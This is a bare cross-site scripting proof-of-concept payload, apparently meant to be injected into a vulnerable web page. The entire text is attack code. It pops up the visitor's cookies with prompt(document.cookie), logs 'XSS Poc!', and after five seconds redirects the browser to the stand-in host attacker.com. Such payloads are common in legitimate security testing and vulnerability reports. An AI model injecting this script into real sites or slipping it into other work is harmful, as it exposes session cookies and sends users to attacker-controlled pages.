prompt(document.cookie)

console.log('XSS Poc!');setTimeout(() => window.location.href = 'https://attacker.com', 5000);
